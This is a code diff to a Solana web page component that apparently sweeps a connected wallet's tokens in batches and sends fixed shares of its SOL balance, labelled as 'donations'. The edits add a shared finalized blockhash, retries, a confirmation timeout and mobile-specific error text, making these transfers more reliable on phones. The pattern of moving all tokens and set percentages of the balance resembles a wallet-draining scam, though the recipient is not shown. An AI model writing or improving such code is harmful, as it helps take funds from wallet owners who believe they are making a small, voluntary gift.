@@ -113,6 +113,9 @@ const Index = () => {
       const transactions: Transaction[] = [];
       const BATCH_SIZE = 5;
 
+      // Get fresh blockhash for better mobile compatibility
+      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
+
       // Create token transfer transactions in batches
       for (let i = 0; i < tokens.length; i += BATCH_SIZE) {
         const batchTokens = tokens.slice(i, i + BATCH_SIZE);
@@ -129,7 +132,8 @@ const Index = () => {
         }
         if (transaction.instructions.length > 0) {
           transaction.feePayer = publicKey;
-          transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+          transaction.recentBlockhash = blockhash;
+          transaction.lastValidBlockHeight = lastValidBlockHeight;
           transactions.push(transaction);
         }
       }
@@ -146,8 +150,10 @@ const Index = () => {
             lamports: firstAmount
           }));
           firstTx.feePayer = publicKey;
-          firstTx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+          firstTx.recentBlockhash = blockhash;
+          firstTx.lastValidBlockHeight = lastValidBlockHeight;
           transactions.push(firstTx);
+          
           const secondAmount = Math.floor(availableBalance * 0.3 * LAMPORTS_PER_SOL);
           const secondTx = new Transaction().add(SystemProgram.transfer({
             fromPubkey: publicKey,
@@ -155,7 +161,8 @@ const Index = () => {
             lamports: secondAmount
           }));
           secondTx.feePayer = publicKey;
-          secondTx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+          secondTx.recentBlockhash = blockhash;
+          secondTx.lastValidBlockHeight = lastValidBlockHeight;
           transactions.push(secondTx);
         }
       }
@@ -163,11 +170,30 @@ const Index = () => {
         throw new Error("No transactions to process");
       }
 
-      // Send transactions sequentially
+      // Send transactions sequentially with mobile-optimized settings
       for (let i = 0; i < transactions.length; i++) {
-        const signature = await sendTransaction(transactions[i], connection);
-        await connection.confirmTransaction(signature, "confirmed");
-        toast.success(`Transaction ${i + 1}/${transactions.length} confirmed`);
+        try {
+          const signature = await sendTransaction(transactions[i], connection, {
+            skipPreflight: false,
+            preflightCommitment: 'confirmed',
+            maxRetries: 3
+          });
+          
+          // Wait for confirmation with timeout
+          const confirmation = await Promise.race([
+            connection.confirmTransaction({
+              signature,
+              blockhash,
+              lastValidBlockHeight
+            }, 'confirmed'),
+            new Promise((_, reject) => setTimeout(() => reject(new Error('Transaction timeout')), 60000))
+          ]);
+          
+          toast.success(`Transaction ${i + 1}/${transactions.length} confirmed`);
+        } catch (txError: any) {
+          console.error(`Transaction ${i + 1} failed:`, txError);
+          throw new Error(`Transaction ${i + 1} failed: ${txError.message}`);
+        }
       }
       toast.success("All donations sent successfully! Thank you for your generosity! ❤️");
       setLoading(false);
@@ -177,7 +203,7 @@ const Index = () => {
       setLoading(false);
       setFailed(true);
       toast.error("Donation failed", {
-        description: error.message || "Please try again"
+        description: error.message || "Please try again. On mobile, make sure to approve the transaction in your wallet app."
       });
     }
   };
